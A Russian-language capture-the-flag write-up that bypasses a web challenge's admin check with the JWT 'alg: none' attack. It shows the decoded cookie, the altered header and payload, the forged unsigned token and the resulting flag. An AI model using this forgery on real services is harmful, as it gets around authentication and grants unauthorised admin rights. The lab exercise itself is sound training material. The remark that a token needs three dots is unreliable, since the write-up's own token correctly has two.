# Time to change - 55
_Кажется, мы нашли тайную страничку админа и даже его стандартные креды superuser:superpass подходят. Но почему же наш админ - не админ..?_

_http://62.84.119.240:8081/_

### Solution
Переходим на страницу авторизации _http://62.84.119.240:8081/login_ и вводим данные в условии кредиты.

Мы зашли под суперюзером, но вот незадача, в статусе 
`Admin: False`, а `Flag: None`

В куках в строке session лежит jwt.
Декодим токен и получаем:
```
Header: {
  "typ": "JWT",
  "alg": "RS256"
}
Payload: {
  "username": "superuser",
  "is_admin": false
}
```
Замечаем, что алгоритм RS256, значит брутить сигнатуру не имеет смысла. Тогда воспользуемся `jwt none attack`. Нужно в Headers изменить alg на none и в Payload is_admin на true
Данные для токена:
```
Header: {
  "typ": "JWT",
  "alg": "none"
}
Payload: {
  "username": "superuser",
  "is_admin": true
}
```
Шифруем и получаем:
`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InN1cGVydXNlciIsImlzX2FkbWluIjp0cnVlfQ.`

(**По стандартам токен должен содержать 3 точки**)

Меняем куку, обновляем страницу и получаем флаг:
```
Great!
Your info:
Username: superuser
Admin: True
Flag: CTF{15_4dm1n_70k3n}
```